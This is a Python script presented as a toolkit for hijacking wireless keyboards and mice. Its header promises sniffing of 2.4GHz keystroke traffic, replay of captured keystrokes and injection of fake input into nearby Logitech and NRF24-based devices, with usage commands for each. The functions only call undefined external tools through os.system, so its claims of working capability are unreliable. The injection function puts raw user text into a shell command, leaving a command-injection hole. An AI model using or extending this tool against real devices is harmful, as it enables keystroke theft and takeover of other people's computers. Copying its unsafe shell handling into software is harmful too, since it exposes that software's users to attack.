import argparse
import os
import time

# -------------------------------------------
# NRF52840 Wireless Keyboard & Mouse Hijacking Toolkit
# -------------------------------------------
# Features:
# - Sniff 2.4GHz wireless keyboard/mouse signals (Logitech, Microsoft, etc.)
# - Capture keystrokes and replay them
# - Inject fake keystrokes or mouse movements to hijack a device
# - Exploit Logitech Unifying & NRF24-based devices
#
# Requirements:
# - NRF52840 Dongle / Dev Board (Adafruit Feather, Nordic Dongle, XIAO NRF52840)
# - Firmware: nRF24 sniffing firmware
# - Python 3.x
#
# Usage:
# 1. Sniff 2.4GHz keyboard/mouse traffic:
#    python nrf52840_nrf24_hijacking.py --sniff
# 2. Inject fake keystrokes:
#    python nrf52840_nrf24_hijacking.py --inject "hello world"
# 3. Replay captured keystrokes:
#    python nrf52840_nrf24_hijacking.py --replay
# 4. Scan for active NRF24-based devices:
#    python nrf52840_nrf24_hijacking.py --scan
# -------------------------------------------

def scan_nrf24():
    """Scans for active NRF24-based wireless keyboard/mouse devices."""
    print("[+] Scanning for active NRF24 devices...")
    os.system("nrf24_scan")

def sniff_nrf24():
    """Sniffs keystrokes or mouse movements from NRF24-based devices."""
    print("[+] Sniffing NRF24 keyboard/mouse traffic...")
    os.system("nrf24_sniff -o keystroke_log.txt")

def inject_nrf24(payload):
    """Injects fake keystrokes or mouse movements into a target device."""
    print(f"[+] Injecting keystrokes: {payload}")
    os.system(f"nrf24_inject --text '{payload}'")

def replay_nrf24():
    """Replays captured keystrokes from a previous session."""
    print("[+] Replaying captured keystrokes...")
    os.system("nrf24_replay keystroke_log.txt")

def main():
    parser = argparse.ArgumentParser(description="NRF52840 NRF24 Wireless Keyboard & Mouse Hijacking Toolkit")
    parser.add_argument("--scan", action='store_true', help="Scan for active NRF24 keyboard/mouse devices")
    parser.add_argument("--sniff", action='store_true', help="Sniff keystrokes/mouse movements")
    parser.add_argument("--inject", type=str, help="Inject keystrokes into a target device")
    parser.add_argument("--replay", action='store_true', help="Replay captured keystrokes")
    args = parser.parse_args()

    if args.scan:
        scan_nrf24()
    elif args.sniff:
        sniff_nrf24()
    elif args.inject:
        inject_nrf24(args.inject)
    elif args.replay:
        replay_nrf24()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
